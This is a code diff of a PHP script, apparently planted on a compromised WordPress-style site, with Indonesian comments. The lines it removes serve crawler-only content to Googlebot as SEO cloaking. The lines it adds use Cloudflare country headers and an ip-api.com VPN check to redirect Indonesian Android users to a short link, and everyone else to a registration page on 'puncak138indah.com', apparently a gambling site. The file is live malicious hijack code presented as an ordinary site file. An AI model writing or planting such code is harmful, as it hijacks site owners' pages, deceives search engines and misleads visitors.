@@ -1,28 +1,43 @@
 <?php
-
-function is_google_bot() {
-    $agents = array(
-        "Googlebot",
-        "Google-Site-Verification",
-        "Google-InspectionTool",
-        "Googlebot-Mobile",
-        "Googlebot-News"
-    );
+// ======== DETEKSI GEO DAN USER AGENT ==========
+function is_mobile_device() {
+    $agents = ['Android'];
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
     foreach ($agents as $agent) {
-        if (strpos($_SERVER["HTTP_USER_AGENT"], $agent) !== false) {
+        if (stripos($ua, $agent) !== false) {
             return true;
         }
     }
-
     return false;
 }
 
-if (is_google_bot()) {
-    $bot_content = file_get_contents("wp-blogs.php");
-    echo $bot_content;
-    die;
-} else {
-    include "wp-headerss.php";
-    die;
+// --- Ambil IP asli (kalau pakai Cloudflare)
+$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
+
+// --- Ambil kode negara dari Cloudflare (kalau ada)
+$country = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? 'XX';
+
+// --- Deteksi mobile dan negara
+$is_mobile = is_mobile_device();
+$is_indonesia = ($country === 'ID');
+
+// --- Deteksi VPN menggunakan ip-api.com (gratis, tapi ada limit)
+$json = @file_get_contents("http://ip-api.com/json/{$ip}?fields=proxy");
+$data = json_decode($json, true);
+$is_vpn = !empty($data['proxy']);
+
+// ======== LOGIKA AKSES ==========
+if ($is_mobile && $is_indonesia && !$is_vpn) {
+    header("Location: https://dub.link/Puncak138");
+    exit;
 }
+
+if ($is_mobile && $is_indonesia && $is_vpn) {
+    header("Location: https://puncak138indah.com/?content=register", true, 302);
+    exit;
+}
+
+header("Location: https://puncak138indah.com/?content=register", true, 302);
+exit;
+?>
